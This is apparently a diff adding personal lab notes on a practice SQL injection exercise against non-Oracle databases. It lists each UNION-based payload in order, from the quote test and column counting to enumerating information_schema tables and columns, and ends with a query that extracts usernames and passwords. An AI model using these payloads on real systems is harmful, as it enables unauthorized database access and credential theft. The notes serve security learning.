@@ -1,0 +1,49 @@
+# SQL injection attack, listing the database contents on non-Oracle databases
+
+Step - 1
+--------
+'
+-
+Error
+Single Quotes
+
+Step - 2
+--------
+'--
+---
+No MySQL
+
+Step - 3
+--------
+' ORDER BY 3--
+--------------
+Error
+2 Column
+
+Step - 4
+--------
+' UNION SELECT NULL,NULL--
+--------------------------
+No Oracle
+
+Step - 5
+--------
+' UNION SELECT NULL,'a'--
+-------------------------
+2 String Column
+
+Step - 6
+--------
+' UNION SELECT NULL,table_name FROM information_schema.tables--
+---------------------------------------------------------------
+Table: users_losije
+
+Step - 7
+--------
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_losije'--
+-------------------------------------------------------------------------------------------------
+Column: username_nlazuv and password_xcildc
+
+Step - 8
+--------
+' UNION SELECT NULL,username_nlazuv || '~' || password_xcildc FROM users_losije--
